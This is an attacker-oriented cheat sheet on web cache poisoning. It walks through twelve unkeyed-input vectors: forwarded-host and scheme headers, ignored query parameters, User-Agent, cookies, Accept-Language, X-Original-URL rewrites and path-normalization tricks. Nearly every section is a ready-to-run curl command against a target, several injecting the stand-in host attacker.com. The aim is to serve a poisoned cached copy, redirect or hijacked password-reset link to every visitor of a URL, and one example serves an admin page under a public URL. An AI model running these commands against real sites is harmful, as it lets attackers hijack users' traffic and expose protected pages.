# Unkeyed inputs — the poisoning vectors, exhaustively

Every request part that can carry a poisoned input — the app reads it,
the cache ignores it.

---

## 1. The unkeyed-header vector — the classic shape

```bash
# an unkeyed reflected header — the app echoes it back, the cache
# doesn't key on it
curl -sI "$BASE/page" -H 'X-Forwarded-Host: attacker.com' | grep -i 'x-forwarded-host\|location\|<'
#   the response reflects the header → the stored copy carries it
```

```bash
# the poisoning request — the header carries the payload
curl "$BASE/page?cb=<unique>" -H 'X-Forwarded-Host: attacker.com'
# a clean request — the stored copy serves YOUR header's effect
curl "$BASE/page?cb=<unique>"   # a different session, the same URL
```

```text
the mechanism: the cache keys on the URL+query, not the header —
the stored response carries YOUR header's effect — every requester
of the same URL gets YOUR poisoned copy.
```

## 2. The unkeyed-parameter vector — a query the cache ignores

```bash
# a parameter the app reads but the cache ignores
curl "$BASE/page?cb=<unique>&utm=<payload>"
# the stored copy carries the payload — the utm is unkeyed
curl "$BASE/page?cb=<unique>"   # the same URL, the stored copy
```

```text
a query parameter the cache ignores (a tracking param, a utm, a
fbclid) — the app reads it, the cache doesn't key on it — the
stored response carries YOUR param's effect.
```

## 3. The Host-header vector — a host the cache ignores

```bash
# a Host/X-Forwarded-Host the app reads but the cache ignores
curl "$BASE/page?cb=<unique>" -H 'X-Forwarded-Host: attacker.com'
# the stored copy's links/redirects point to attacker.com
```

```text
a Host or X-Forwarded-Host the app uses for absolute URLs, redirects,
or password-reset links — the stored copy's URLs point to YOUR host
— every requester's copy has YOUR host.
```

## 4. The scheme-header vector — an http/https confusion

```bash
# an X-Forwarded-Scheme the app reads — a redirect to http/https
curl "$BASE/page?cb=<unique>" -H 'X-Forwarded-Scheme: http'
# the stored copy's links point to http — a downgrade or a redirect
```

## 5. The User-Agent vector — a UA-dependent response

```bash
# a User-Agent the app personalizes on — a browser-specific response
curl "$BASE/page?cb=<unique>" -A '<payload>'
# the stored copy serves YOUR UA's response to every requester
```

```text
a User-Agent the app personalizes on (a mobile-vs-desktop, a
browser-specific) — the stored copy serves YOUR UA's response to
every requester.
```

## 6. The cookie vector — a cookie the cache ignores

```bash
# a cookie the app reads but the cache ignores (not in Vary)
curl "$BASE/page?cb=<unique>" -H 'Cookie: theme=<payload>'
# the stored copy carries the theme — a per-cookie response served
# to every requester
```

```text
a cookie the app reads but the cache doesn't Vary on — the stored
copy carries the per-cookie response to every requester.
```

## 7. The Accept-Language vector — a localized response

```bash
# an Accept-Language the app localizes on
curl "$BASE/page?cb=<unique>" -H 'Accept-Language: <payload>'
# the stored copy serves YOUR language to every requester
```

## 8. The X-Original-URL / X-Rewrite-URL vector — a path rewrite

```bash
# an X-Original-URL the app honors — a rewritten path
curl "$BASE/page?cb=<unique>" -H 'X-Original-URL: /admin'
# the stored copy serves the admin page under the public URL
```

```text
an X-Original-URL or X-Rewrite-URL the app honors — a rewritten path
— the stored copy serves the rewritten response under the public URL.
```

## 9. The path-normalization vector — a URL confusion

```bash
# a path the cache and the app normalize differently
curl "$BASE/page/../admin?cb=<unique>"
curl "$BASE/page%2f..%2fadmin?cb=<unique>"
# the cache stores it under one URL; the app serves a different route
```

```text
a path the cache and the app normalize differently — a static-looking
URL served the dynamic response — the stored copy's URL is the
victim's URL, the response is YOUR request's.
```

## 10. The fragment/param-append vector — a key-append

```bash
# a param the cache keys on but the app ignores — a cache-buster
curl "$BASE/page?cb=<unique>&_=<random>"
# the stored copy is keyed per-_ — a fresh entry, not a poisoned one
```

```text
a cache-buster defeats the poisoning — a keyed param the app ignores
keys the entry per-value — the stored response is YOUR requests only.
```

## 11. The per-vector selection — which unkeyed input

```text
an unkeyed reflected header        → the header vector
an unkeyed query parameter         → the param vector
a Host/X-Forwarded-Host            → the host vector
an X-Forwarded-Scheme              → the scheme vector
a User-Agent                       → the UA vector
a cookie (not in Vary)             → the cookie vector
an Accept-Language                 → the language vector
an X-Original-URL/X-Rewrite-URL    → the path-rewrite vector
a path normalization boundary      → the path-confusion vector
```

## 12. The unkeyed-input check — is it really unkeyed

```bash
# send the input → check the stored copy serves it to a clean request
curl "$BASE/page?cb=<unique>" -H 'X-Forwarded-Host: <marker>'
curl "$BASE/page?cb=<unique>"   # a clean request — does it reflect <marker>?
#   <marker> reflected in the clean response → unkeyed → poisonable
#   <marker> NOT reflected → the header IS keyed → a different class
```
